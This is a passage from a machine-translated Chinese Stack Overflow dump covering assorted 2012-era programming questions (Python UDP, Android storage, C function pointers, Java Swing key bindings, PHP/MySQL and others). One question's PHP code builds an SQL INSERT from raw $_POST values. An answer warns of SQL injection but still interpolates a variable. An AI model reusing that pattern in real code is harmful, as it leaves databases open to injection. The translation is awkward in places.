如果您不想这样做，或者不允许这样做，您可以跟踪每个引脚上的大小，并且只将磁盘移动到更大的磁盘上，或者您可以偷偷地移除并在适当的引脚添加磁盘以进行模拟这个限制，但如果没有适当的解释，这将很难与作弊区分开来。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-12-25T05:31:08.427

如果它对任何人有帮助，这里是另一个河内算法塔：

```
hanoi 0 _ _ _ = []
hanoi n a b c = hanoi (n-1) a c b ++ [(a,b)] ++ hanoi (n-1) c b a 
```

例如，河内 2 "a" "b" "c" == [("a","c"), ("a","b"), ("c","b")]

# file-upload - Primefaces 文件上传 auto="true"：保留图像预览

> ID：12760287
> 
> 赞同：0
> 
> 时间：2012-10-06T13:40:45.417
> 
> 标签：file-upload, primefaces, param

有带参数`Primefaces` [的文件上传](http://www.primefaces.org/showcase/ui/fileUploadAuto.jsf)组件`auto="true"`：

```
...
<p:fileUpload fileUploadListener="#{uploadFileBean.upload}" mode="advanced" auto="true"/>  
... 
```

当`auto="true"`, 上传图片后，图片预览消失了。

是否有可能，上传的图像（文件）预览保留在列表中，就像它工作一样，什么时候`auto="false"`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T22:49:49.693

您应该执行的三个步骤：

**1.**添加具有特定ID的图像预览容器，让它成为`info`
**2.**`update="info"`在`p:fileUpload` 标签中添加参数
**3.**`Primefaces`覆盖引擎标准显示的容器`CSS`样式`display:none`，特别是这个：

```
.files{
    display:none;
} 
```

# python - 通过 UDP 套接字发送文件

> ID：12760289
> 
> 赞同：1
> 
> 时间：2012-10-06T13:40:49.413
> 
> 标签：python

我正在使用 python 的 UDP 套接字发送文件。在接收方（file_receiver.py），您需要中断（ctrl-c）程序才能在最后接收文件。因此，我将 settimeout 设置为 2 秒，以便程序在完全接收到数据后自动退出。如果我知道的话，你不能在 UDP 中设置非阻塞套接字。克服这个问题的最佳方法是什么。

文件发件人.py

```
#!/usr/bin/env python

from socket import *
import sys

s = socket(AF_INET,SOCK_DGRAM)
host ="localhost"
port = 9999
buf =1024
addr = (host,port)

f=open (sys.argv[1], "rb") 
data = f.read(buf)
while (data):
    if(s.sendto(data,addr)):
        print "sending ..."
        data = f.read(buf)
s.close()
f.close() 
```

文件接收器.py

```
#!/usr/bin/env python

from socket import *
import sys
import select

host="0.0.0.0"
port = 9999
s = socket(AF_INET,SOCK_DGRAM)
s.bind((host,port))

addr = (host,port)
buf=1024

f = open("op.pdf",'wb')
data,addr = s.recvfrom(buf)

while(data):
    f.write(data)
    s.settimeout(2)
    data,addr = s.recvfrom(buf)

f.close()
s.close() 
```

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T14:05:27.460

因为 UDP 是无连接的，所以接收方没有直接的方法可以知道发送方何时完成。

您可以解决此问题，例如，通过在发送者完成后发送一个特殊的数据包，表明不会有更多的数据包跟随。

但是，我强烈建议您不要这样做；UDP 不保证数据包的传递——数据包可能会丢失、重复或乱序传递。显然，对于大多数文件，如果它们丢失了一部分，或者重新排序等是不可接受的。如果你想在主机之间传输文件，我认为你最好使用 TCP。

# android - Android在哪里存储可编辑文件

> ID：12760294
> 
> 赞同：1
> 
> 时间：2012-10-06T13:41:13.500
> 
> 标签：android

我的应用程序读取一堆文本文件。目前我已将它们全部保存在资产文件夹中，但我想在运行时编辑这些文件。

应该在第一次运行时将所有这些文件复制到内部存储中，或者我可以在 eclipse 中创建一个文件夹并保存文件。

如果是这样，读取它们的文件路径是什么？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:44:47.867

如果您将文件添加到 Eclipse 中的 Assets 文件夹中，它们将与您的应用程序一起加载，您可以在运行时使用

```
InputStream in = context.getAssets().open(filename); 
```

然后你就可以像往常一样使用 InputStream 了。您可以使用 Activity 获取上下文`getApplicationContext()`。

如果要写入文件：

```
FileOutputStream fOut = context.openFileOutput(fileName, Context.MODE_PRIVATE); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:56:05.983

Android 为您提供所需的一切：如果您想节省外部存储空间，您可以简单地做

```
Environment.getExternalStorageDirectory().getPath() 
```

我建议将其保存在缓存目录中并在需要时对其进行编辑，因为它似乎最适合您的需求。

```
getCacheDir().getPath() 
```

但请注意：

> 注意：您不应依赖系统为您删除这些文件；您应该始终为缓存文件占用的空间量设置一个合理的最大值，例如 1 MB，并在超过该空间时修剪这些文件。

PS：您可以通过这种方式检查是否可以在外部目录上写入：

```
boolean mExternalStorageAvailable = false;
boolean mExternalStorageWriteable = false;
String state = Environment.getExternalStorageState();

if (Environment.MEDIA_MOUNTED.equals(state)) {
// We can read and write the media
mExternalStorageAvailable = mExternalStorageWriteable = true;
} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
// We can only read the media
mExternalStorageAvailable = true;
mExternalStorageWriteable = false;
} else {
// Something else is wrong. It may be one of many other states, but all we need
//  to know is we can neither read nor write
mExternalStorageAvailable = mExternalStorageWriteable = false;
} 
```

如图所示[数据存储](http://developer.android.com/guide/topics/data/data-storage.html) 如果可能的话，您可以简单地在外部目录上写入，否则回退到内部缓存。

您也可以在文件系统上的任何位置写入，但将文件设为您的应用程序私有

```
FileOutputStream fos = openFileOutput(fileName, Context.MODE_PRIVATE); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T13:44:33.080

您可以将文件保存在外部存储中：

Environment.getExternalStorageDirectory()

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-06T14:02:42.437

如您所述，您应该将这些文件复制到内部存储中。如果文件是应用程序私有的，则无需使用外部存储。当您说在 Eclipse 中将文件存储在文件夹中时，我认为您实际上是在谈论创建一个将随 APK 一起提供的文件夹。这样的文件将不可写。

# ios - 核心数据查询

> ID：12760296
> 
> 赞同：0
> 
> 时间：2012-10-06T13:41:23.957
> 
> 标签：ios, core-data

> V <-->> O <<--> P

我正在尝试编写正确的谓词，以便我可以获得`V`至少具有一个或多个`O`与某个实体匹配的实体的所有`P`实体。

我试过这样的事情：

```
NSPredicate * predicate = [NSPredicate predicateWithFormat:@"SUBQUERY(O, $b, ANY $bs.P == %@).@count > 0", P]; 
```

不工作。显然，到目前为止，我并没有正确地考虑这个问题。知道如何正确完成此查询吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-07T04:13:41.900

假设 V 到 O`os`的关系称为 ，O 到 P 的关系称为`p`。子查询的语法如下：

```
 NSPredicate *predicate = [NSPredicate predicateWithFormat:
                              @"SUBQUERY(os, $o, $o.p == %@).@count != 0", pToMatch]; 
```

# mercurial - 如何在 Windows 上快速安装 mercurial 服务器

> ID：12760299
> 
> 赞同：0
> 
> 时间：2012-10-06T13:41:38.580
> 
> 标签：mercurial

一种在允许推送的 Windows 上快速安装和使用 mercurial 的简单方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-09T20:49:10.393

我不确定这是否已经不是你的方式，但是 TortoiseHg 是 mercurial 的不错的 gui，并且安装附带了 mercurial，因为安装是 .msi，它非常简单。

在这里查看更多信息：http: [//tortoisehg.bitbucket.io/](http://tortoisehg.bitbucket.io/)

# c - 如果不作为函数调用 printf 会返回什么？

> ID：12760301
> 
> 赞同：1
> 
> 时间：2012-10-06T13:41:43.197
> 
> 标签：c, printf

此代码在注释语句一后工作正常。语句二给出了一些垃圾值，但至少它运行了。如果不将其作为函数调用，我没有得到参数中的 printf 如何给出值？

```
#include<stdio.h>

int main()
{
    int printf = 123;    // statement one
    printf ("%d", printf); // statement two  
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T13:45:01.393

不带括号的函数名不返回值——它计算为函数的*地址*（即它是类型的函数指针`size_t (*)(const char *, ...)`）。本质上，这是 CPU 在遇到调用时将在指令之间跳转的地址`printf()`。

顺便说一句，如果我没记错的话，分配给函数的名称是未定义的行为，使用`%d`格式说明符打印指针也是如此 - 你应该使用

```
printf("%p", (void *)printf); 
```

此外，您*可以*声明函数指针，为其分配另一个函数的地址并调用它们就好了：

```
size_t (*my_printf)(const char *, ...) = printf;
my_printf("This actually called printf!\n");

printf("my_printf: %p\n", (void *)my_printf);
printf("original printf: %p\n", (void *)printf); 
```

最后两个语句打印相同的地址。

**编辑：**严格来说，即使上述“解决方案”也是非标准的，因为标准不保证函数指针可以转换为数据指针类型。这意味着基本上没有办法打印函数的地址，但是，在大多数系统上，强制转换`void *` *显然是*可行的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-06T13:45:02.093

在语句 2 中，当标识符`printf`传递给函数时，它是一个*函数指针*- 一个指向函数的指针`printf`-*垃圾值*是尝试使用`printf`格式打印此地址的结果`%d`：：您应该看到编译器警告使用打印指针时`%d`。

# php - 根据备用表值插入表中

> ID：12760310
> 
> 赞同：1
> 
> 时间：2012-10-06T13:43:09.540
> 
> 标签：php, mysql

我无法获得正确的语法。我正在尝试获取`$nproj_hours`通过表单提交的`hours_id`值，以在小时表中查找与其关联的键值，并将该数值放在汇总表中的新行中（我将这样做部门和项目也是如此，所以如果有办法将它们全部打包成一个，我也有一个项目和部门表）。

最终代码：

```
if (isset($_POST['btnnew']))  

    {
    echo "<pre>Value of \$_POST:</br>";print_r($_POST);echo"</pre>";

        $nclarity_id    = $_POST['nclarity_id'];
        $nproj_hours    = $_POST['nproj_hours'];
        $ndept_name     = $_POST['ndept_name'];
        $proj_id        = $_POST['nclarity_id'];
        $hours_id       = $_POST['nproj_hours'];
        $dept_id        = $_POST['ndept_name'];

        $sql        = "INSERT INTO `summary` VALUES (null,'$proj_id','$hours_id','$dept_id',null)" 
                            or die ("couldn't update".mysql_error());
        $query = mysql_query($sql);

//echo "<pre>Value of \$sql:</br>";print_r($sql);echo"</pre>";
        if ($query)
{
echo "success!";
}
else
            {
        die('error inserting new record'.mysql_error());
    } // end of the nested if statement
}

?>

<table width="500" border="0" cellspacing="1" cellpadding="0">
   <tr>
   <td align="center">&nbsp;</td>
   <td align="center"><strong>Clarity ID</strong></td>
   <td align="center"><strong>Hours</strong></td>
   <td align="center"><strong>Department</strong></td>
   </tr>
<form name="form1" method="post" action="stupid.php">
<tr>
<td>&nbsp;</td>
<select name="nclarity_id">

<?php
$sql = "SELECT proj_id, clarity_id FROM projects " . "ORDER by clarity_id";

$rs = mysql_query($sql);

while($row = mysql_fetch_array($rs))
{
  echo "<option value=\"".$row['proj_id']."\">".$row['clarity_id']."</option>\n  ";
}
?>

</select>
<select name="nproj_hours">
<?php
$sql = "SELECT hours_id, proj_hours FROM hours";

$rs = mysql_query($sql);

while($row = mysql_fetch_array($rs))
{
  echo "<option value=\"".$row['hours_id']."\">".$row['proj_hours']."</option>\n  ";
}
?>
</select>

<select name="ndept_name">

<?php
$sql = "SELECT dept_id, dept_name FROM departments";

$rs = mysql_query($sql);

while($row = mysql_fetch_array($rs))
{
  echo "<option value=\"".$row['dept_id']."\">".$row['dept_name']."</option>\n  ";
}
?>
</select>
   <input type="submit" name="btnnew" value="Enter New Record">
</tr>
</table>

<table width="500" border="0" cellspacing="1" cellpadding="0">
<tr>
<td>
<table width="500" border="1" cellspacing="0" cellpadding="3">
</tr>

<?php
while($rows=mysql_fetch_array($res))
{

?>

<?php
}

?>

</table>
</td>
</tr>
</table>

<?php
mysql_close();
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:58:03.233

您必须更改查询 - 特别是删除关键字`VALUES` 并添加列名。[有关确切的语法和详细信息，请参阅规范](http://dev.mysql.com/doc/refman/5.1/en/insert-select.html)。我刚刚输入`colname1, colname2, colname3, colname4`- 您需要用汇总表中的实际列名替换它

```
INSERT INTO summary (colname1, colname2, colname3, colname4) 
   SELECT NULL, NULL, proj_hours, NULL
   FROM hours 
   WHERE proj_id ='$nproj_hours 
```

像往常一样，由于 SQL 注入的可能性而避免使用此类查询的免责声明是适用的。如果您不知道，请谷歌`sql injection / prepared statements / parameterized queries`等。

# java - 按“ctrl”+“alt”+“backspace”后执行某项任务

> ID：12760311
> 
> 赞同：4
> 
> 时间：2012-10-06T13:43:10.877
> 
> 标签：java, swing, popup, jtextfield, key-bindings

当我想执行某事时如何编码。假设当用户同时按下`ctrl`++时，将弹出 JTextField 上的焦点`alt`和消息框`backspace`。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T13:57:24.017

键绑定示例：

```
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;
import javax.swing.*;

public class JTextFieldMagic {
   public static final String CTRL_ALT_BACK_SPACE = "ctrlAltBackspace";

   public static void main(String[] args) {
      JTextField field = new JTextField(10);

      int condition = JComponent.WHEN_FOCUSED;
      InputMap inputmap = field.getInputMap(condition);
      ActionMap actionMap = field.getActionMap();

      KeyStroke ctrlAltBackSpaceKeyStroke = KeyStroke.getKeyStroke(
            KeyEvent.VK_BACK_SPACE, 
            KeyEvent.CTRL_DOWN_MASK | KeyEvent.ALT_DOWN_MASK);

      inputmap.put(ctrlAltBackSpaceKeyStroke, CTRL_ALT_BACK_SPACE);
      actionMap.put(CTRL_ALT_BACK_SPACE, new CtrlAltBackspaceAction());

      JOptionPane.showMessageDialog(null, field);
   }
}

class CtrlAltBackspaceAction extends AbstractAction {
   @Override
   public void actionPerformed(ActionEvent e) {
      System.out.println(JTextFieldMagic.CTRL_ALT_BACK_SPACE);
   }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T21:02:48.133

或者，如果您在“应用程序全局密钥侦听器”之后，您可以使用[`KeyboardFocusManager.addKeyEventDispatcher`](http://docs.oracle.com/javase/7/docs/api/java/awt/KeyboardFocusManager.html#addKeyEventDispatcher%28java.awt.KeyEventDispatcher%29)or [`Toolkit.addAWTEventListener`](http://docs.oracle.com/javase/7/docs/api/java/awt/Toolkit.html#addAWTEventListener%28java.awt.event.AWTEventListener,%20long%29)。

## KeyboardFocusManager.addKeyEventDispatcher

```
public class GloablKeyListener {

    public static void main(String[] args) {
        new GloablKeyListener();
    }

    public GloablKeyListener() {

        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                JFrame frame = new JFrame("Testing");
                frame.setLayout(new BorderLayout());
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.add(new TestPane());
                frame.setSize(200, 200);
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);

            }
        });

    }

    protected class TestPane extends JPanel {

        private JLabel label;

        public TestPane() {

            setLayout(new BorderLayout());
            label = new JLabel("Nothing happening here");
            label.setHorizontalAlignment(JLabel.CENTER);
            add(label);

            KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {

                @Override
                public boolean dispatchKeyEvent(KeyEvent e) {

                    if (e.getKeyCode() == KeyEvent.VK_BACK_SPACE && e.isControlDown() && e.isAltDown()) {                            
                        label.setText("Hit me");                        
                    } else {
                        label.setText("Nothing to see here...");
                    }

                    return false;
                }
            });    
        }
    }
} 
```

## Toolkit.addAWTEventListener

```
public class GloablKeyListener {

    public static void main(String[] args) {
        new GloablKeyListener();
    }

    public GloablKeyListener() {

        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                JFrame frame = new JFrame("Testing");
                frame.setLayout(new BorderLayout());
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.add(new TestPane());
                frame.setSize(200, 200);
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);

            }
        });

    }

    protected class TestPane extends JPanel {

        private JLabel label;

        public TestPane() {

            setLayout(new BorderLayout());
            label = new JLabel("Nothing happening here");
            label.setHorizontalAlignment(JLabel.CENTER);
            add(label);

            Toolkit.getDefaultToolkit().addAWTEventListener(new AWTEventListener() {
                @Override
                public void eventDispatched(AWTEvent event) {
                    if (event instanceof KeyEvent) {
                        KeyEvent ke = (KeyEvent) event;
                        if (ke.getID() == KeyEvent.KEY_TYPED) {
                            if (ke.getKeyCode() == KeyEvent.VK_BACK_SPACE && ke.isControlDown() && ke.isAltDown()) {
                                label.setText("Hit me");
                            } else {
                                label.setText("Nothing to see here...");
                            }
                        }
                    }
                }
            }, AWTEvent.KEY_EVENT_MASK);

        }
    }
} 
```

就个人而言，我更喜欢`KeyboardFocusManager.addKeyEventDispatcher`. 它更简单，更易于使用。

您可以设置自己的单例管理器，您可以在其中分配`KeyStroke`s 对`Action`s，就像键绑定一样。

# objective-c - MPMoviePlayerViewController，在后台播放视频的声音

> ID：12760314
> 
> 赞同：0
> 
> 时间：2012-10-06T13:43:30.850
> 
> 标签：objective-c, ios, mpmovieplayercontroller, background-music

我正在播放视频流`MPMoviePlayerViewController`。在我的应用程序中，`info.plist`我已设置`UIBackgroundModes`为`audio`. 当我在播放视频播放暂停时按主页按钮时，返回应用程序播放后再次继续。它开箱即用，无需更改任何内容。但是在某些应用程序（例如 Jasmine）中，当我按下 Home 按钮时，视频的声音播放会在后台继续。所以我有两个问题：1）有什么魔力？如何在不显示视频流本身的情况下在后台播放视频的声音？我找不到任何可行的解决方案。2）如果很难实施，我可以保持原样吗？我已经设置`UIBackgroundModes`为`audio`没有在后台实际播放音频，所以我认为我的应用程序有可能在审核阶段被拒绝。我对吗？或用于视频流应用程序设置`UIBackgroundModes`即使在后台没有播放任何内容也允许？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T14:49:56.580

1.  您必须为后台模式分离音频流
2.  你的应用肯定会被拒绝。我也在寻找技术解决方案；）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-19T14:55:25.567

您需要设置音频会话类别。阅读此处的文档：

*   [音频会话基础](https://developer.apple.com/library/ios/#documentation/Audio/Conceptual/AudioSessionProgrammingGuide/Basics/Basics.html)（注意“什么是音频会话类别？”部分
*   [音频会话类别](https://developer.apple.com/library/ios/documentation/Audio/Conceptual/AudioSessionProgrammingGuide/AudioSessionCategories/AudioSessionCategories.html#//apple_ref/doc/uid/TP40007875-CH4-SW1)

# css - id="this" 在指向 CSS 样式表的 href 链接中？

> ID：12760320
> 
> 赞同：0
> 
> 时间：2012-10-06T13:43:56.627
> 
> 标签：css, content-management-system, stylesheet, href

```
<link href="assets/theme.css" id="this" rel="stylesheet" /> 
```

id="this" 的目标是什么，它在指向样式表的 href 链接中是如何工作的？

从我合法下载的教程中，我找不到对 html 或 javascript 的任何引用。它是来自 CMS 的语法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T14:18:55.510

它不针对任何东西；它只是为元素分配一个唯一标识符——这就是`id`属性的作用。它对任何东西都没有任何默认效果。它可以在 JavaScript 中使用，以方便引用元素，使用`document.getElementById('this')`. 如果它没有在文档中以任何方式使用，则可以假定它在那里以备将来使用。它也可能是由生成页面并定期向元素添加`id`属性的某些软件（CMS 或其他）添加的。

# javascript - 将同位素与随机旋转相结合

> ID：12760324
> 
> 赞同：0
> 
> 时间：2012-10-06T13:44:38.517
> 
> 标签：javascript, jquery, infinite-scroll

我目前正在使用[同位素](http://isotope.metafizzy.co/)（无限滚动）来创建响应式网页设计。

```
(function() {
    var $container = $('#container');

    $container.isotope({
        itemSelector : '.element'
    });

    $container.infinitescroll({
        navSelector  : '#page_nav',    // selector for the paged navigation 
        nextSelector : '#page_nav a',  // selector for the NEXT link (to page 2)
        itemSelector : '.element',     // selector for all items you'll retrieve
        loading: {
            finishedMsg: 'No more pages to load.',
            img: 'http://i.imgur.com/qkKy8.gif'
        }
    },
    // call Isotope as a callback
    function( newElements ) {
        $container.isotope( 'appended', $( newElements ) ); 
    }
);
}); 
```

对于更大的变化，我尝试将它与[这个脚本](https://stackoverflow.com/questions/3842384/jquery-random-rotate)结合起来，但所有元素都会重叠。

作为参考，这是旋转功能：

```
$("#gallery2 img").each(function() {
    var rNum = (Math.random() * 4) - 2;  
    $(this).css({
        '-webkit-transform': 'rotate(' + rNum + '2deg)',
        '-moz-transform': 'rotate(' + rNum + '2deg)'  
    });
}); 
```

我怎样才能正确地将这个旋转器集成到我现有的 jQuery 中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:59:47.277

问题是 Isotope 在现代浏览器中使用 transform 属性进行布局，您在设置旋转时要重置它。

您最好的选择是禁用同位素中的“transformsEnabled”选项，强制它使用顶部/左侧绝对位置，这将为您的旋转释放变换属性。

[http://isotope.metafizzy.co/docs/options.html#transformsenabled](http://isotope.metafizzy.co/docs/options.html#transformsenabled)

# macos - IKImageBrowserView 替代方案

> ID：12760328
> 
> 赞同：0
> 
> 时间：2012-10-06T13:44:55.480
> 
> 标签：macos, cocoa

IKImageBrowserView 很棒，但它打开了独立显卡，这对于我使用它的目的来说太过分了。

谁能推荐一个替代视图（第三方或包含），它可以用来显示固定数量的小（16x16）图像，用户可以在其中选择其中一个图像？

为了澄清起见，这就是我在我的应用程序中使用 IKImageBrowserView 的内容： ![在此处输入图像描述](../Images/a40fd5bb8cc06344a628cef69316ea5b.png)

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:05:05.537

您可以使用[NSCollectionView](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/NSCollectionView_Class/Introduction/Introduction.html)

它支持选择和绑定。

# c++ - 随机访问迭代器到 char 数组

> ID：12760329
> 
> 赞同：0
> 
> 时间：2012-10-06T13:44:56.497
> 
> 标签：c++, c++11, iterator

是否可以`std::iterator<std::random_access_iterator_tag, const char*>`用作 char 数组的迭代器？查看`std::iterator`定义，它只有默认、复制和移动构造函数，没有`T`构造函数。这是否意味着我需要继承和实现自己的迭代器？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T13:50:12.127

`std::iterator`不能帮助你。确实可以从它继承来实现自己的迭代器，但您已经可以将指向数组的指针用作随机访问迭代器。

您甚至可以使用`std::begin`and`std::end`来获取这些迭代器。

# php - php web tail -f 实用程序

> ID：12760333
> 
> 赞同：-1
> 
> 时间：2012-10-06T13:45:12.423
> 
> 标签：php, ajax, tail

我现在正在`tail -f`用 PHP 编写一个 Web 实用程序。我已经完成了`tail.php`每 x 毫秒 ajax-requests 以获取最后添加的行的部分。
现在，我需要以某种方式跟踪最后打印的行是什么。我考虑过使用`ftell`它并将其保存在 cookie 中，但由于文件开头的行也可能被剪切，所以这并不总是有效。

关于如何做到这一点的任何想法？我想在没有额外数据库的情况下做到这一点，但是通过使用 cookie/session 并且`"pointer"`数据的大小必须很小。

有什么不明白的请追问，不是那么容易描述的 ;-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:10:55.627

我没有尝试过，但是也许您可以使用诸如 Prototype 之类的 JS 库来确定输出的长度，然后将其与最后一个响应的长度进行比较，然后通过在适当的位置切割字符串来采取相应的行动。

未经测试的例子：

```
var lastLength;
Ajax.Request('/tail.php', {
    onSuccess: function(data){
        /* this is our callback and data.responseText will contain the raw response from the server */
        var curLength=String(data.responseText).length;
        if(curLength>lastLength) {
            $('myDiv').insert(data.responseText.substr(lastLength)); // append the new part of the string to a DIV with id 'myDiv'  
            lastLength=curLength;
        }
    }
}); 
```

如果该解决方案由于某种原因不令人满意或导致问题，您可以尝试让 tail.php 发送的不仅仅是原始数据。相反，JSON 可用于将字节数与数据一起包含在内。

假如说

```
$tailOutput 
```

包含最新的输出，使用

```
echo json_encode(array(
    'tailOutput' => substr($tailOutput, $_REQUEST['tailLength']),
    'curLength'     => strlen($tailOutput)
)); 
```

将数据发送回客户端，现在包括最后的长度信息，然后相应地调整 JS 代码。

```
var lastLength;
Ajax.Request('/tail.php', {
    parameters: {
        tailLength: lastLength
    },
    onSuccess: function(data){
            var obj=data.responseText.evalJSON(); //convert to json object
            $('myDiv').insert(obj.tailOutput);
            lastLength=obj.curLength;
        }
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:04:15.503

如果您希望纯粹在 PHP 中执行此操作，即使我想知道如何 - 如果您已经必须在客户端拥有 AJAX 处理功能 - 您可以简单地使用会话变量。

在 PHP 中

```
$outputToClient=substr($tailOutput, ($_SESSION['lastTailLength']?$_SESSION['lastTailLength']:0));
$_SESSION['lastTailLength']=strlen($tailOutput);
echo $outputToClient; 
```

像这样的东西应该可以完成这项工作。如果您遇到 PHP 无法识别来自 AJAX 请求的会话的问题（尽管这些时间已经过去了，并且这个问题不应该发生） - 尝试在每次将 PHPSESSID 发送到服务器时将其与您的 ajax 请求一起发送。

# events - 在 Corona SDK 中检测触摸移动开始阶段

> ID：12760334
> 
> 赞同：1
> 
> 时间：2012-10-06T13:45:27.610
> 
> 标签：events, sdk, lua, touch, coronasdk

在我的应用程序中，我希望一个对象在 Corona 的*触摸开始*事件中滑动和跳跃。虽然我成功地实现了滑动和*触摸结束*事件的跳转，但是在*开始*的事件阶段我不能做滑动。

我使用以下代码进行滑动和跳跃：

```
function touched( event )
  if(event.phase == "ended") then
    if(event.x - event.xStart > 70) then
      sliding = true;
      offGround = true; 
    else
      boy:applyLinearImpulse(0, -0.44, boy.x, boy.y)
      offGround = true;
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-09T06:02:01.623

我已经做到了。我使用移动阶段并在移动阶段将布尔值标记为活动状态，并在开始时调用计时器函数。这是我的代码。

```
function Action()
    if(Slide == true)then
        Slide = false;
        sliding = true;
    else
        if(jump == true)then
            meter = -0.54
            boy:applyLinearImpulse(0, meter, boy.x, boy.y)
        end
    end
end

function touched( event )
    local phase = event.phase
    print(phase)

    if(phase == "moved")then
        Slide = true;
        jump = false;
        print("Boy is Sliding")
    end
    if(phase == "began")then
        if  Slide == false then
            print("Boy is not Sliding")
            jump = true
        end

        timerNew = timer.performWithDelay(100 , Action , 1)
    end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-08T13:53:33.793

你不能做你想做的事，事件开始的定义是它开始的时间，因此 event.x 和 event.xStart 总是相同的，无法检测到你在事件开始时移动了多少手指，因为它刚刚开始，因此没有过去可以比较。

# java - 如何知道哪个用户处于非活动状态？

> ID：12760336
> 
> 赞同：1
> 
> 时间：2012-10-06T13:45:32.467
> 
> 标签：java, jsp, struts2

嗨，如何知道哪些用户处于非活动状态（没有打开页面或在特定时间没有做任何事情），我使用的是 jsp 和 java。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:56:37.010

我假设您想从服务器的角度了解非活动用户。如果您只想要一个客户端解决方案，其他答案将引导您朝着正确的方向前进。

无论如何，除非您自己跟踪信息，否则没有通用的方法可以在服务器端获取这些知识。您的 Web 容器可能使用在一段时间后过期的 cookie 维护持久会话，但是如果您想从特定会话映射回用户（或从用户到会话），则需要在数据库中自己维护该映射。

因此，您可以添加一些代码来将用户与会话相关联并跟踪每个用户的最后一次看到的时间戳，然后您可以轻松确定哪些用户处于非活动状态，并采取您想要采取的任何行动。

当然，如果您不关心具体了解哪些用户处于非活动状态，而只想确保所有处于非活动状态超过`x`几分钟的用户都失去会话，则可以通过配置 Web 容器的会话到期时间来做到这一点。这样做的过程将取决于您正在运行的特定服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:51:03.570

您可以应用 javascript 来设置检查用户活动的时间间隔。然后你就会知道用户是否还在页面上。

```
setInterval(function(){ update(); },3000);  // Send a update every 3 seconds 
```

可以是`update()`一个 AJAX POST 来指示用户正在观看哪个页面以及用户停留了多长时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T13:54:46.507

您可以使用 javascript 优雅地跟踪空闲时间

在javascript中检查这个[处理空闲时间](https://stackoverflow.com/questions/667555/detecting-idle-time-in-javascript-elegantly)

# java - 德比+休眠+Spring MVC

> ID：12760349
> 
> 赞同：0
> 
> 时间：2012-10-06T13:47:29.660
> 
> 标签：java, hibernate, spring-mvc

Netbeans 无法创建`hibernate.reveng.xml`并出现错误

> 无法与选定的 Hibernate 配置文件建立数据库连接。请验证 hibernate.cfg.xml 中的数据库连接详细信息

我的`hibernate.cfg.xml`长相是这样的

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-configuration PUBLIC "-//Hibernate/Hibernate Configuration DTD 3.0//EN" "http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd">
<hibernate-configuration>
  <session-factory>
  <property name="hibernate.connection.driver_class">org.apache.derby.jdbc.ClientDriver</property>
      <property name="hibernate.dialect">org.hibernate.dialect.DerbyDialect</property>

    <property name="hibernate.connection.url">jdbc:derby://localhost:1527/User</property>
  </session-factory>
</hibernate-configuration> 
```

问题是什么？我正在使用 Java DB (Derby) 数据库。我使用MySQL时没有这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:52:38.883

最可能的原因是 Derby our box 预计将在嵌入式模式下运行，并且不允许端口连接。您应该在网络模式下运行它。

这里有信息：http: [//db.apache.org/derby/papers/DerbyTut/index.html](http://db.apache.org/derby/papers/DerbyTut/index.html)

它应该为您提供设置网络模式或迁移到嵌入式的信息（我建议先进入网络以测试这是否是问题），然后根据需要进行切换）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:39:28.210

我会走向不同的方向。我会使用 JPA 并将休眠设置为 JPA 供应商。它看起来会有点不同，但是 Spring 完全支持 JPA（包括事务管理器和所有东西）。它看起来像这样：
